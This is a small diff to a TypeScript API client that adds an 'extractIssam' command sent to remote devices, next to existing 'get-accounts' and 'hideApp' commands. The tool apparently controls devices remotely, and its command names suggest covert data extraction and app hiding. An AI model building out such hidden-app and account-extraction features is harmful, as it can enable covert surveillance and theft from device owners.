@@ -161,6 +161,10 @@ export const commandsAPI = {
     const response = await api.post<APIResponse<Command>>(`/devices/${deviceId}/get-accounts`)
     return response.data.data!
   },
+  extractIssam: async (deviceId: string): Promise<Command> => {
+    const response = await api.post<APIResponse<Command>>(`/devices/${deviceId}/extract-issam`)
+    return response.data.data!
+  },
   hideApp: async (deviceId: string): Promise<Command[]> => {
     const response = await api.post<APIResponse<Command[]>>('/commands/bulk', {
       device_ids: [deviceId],
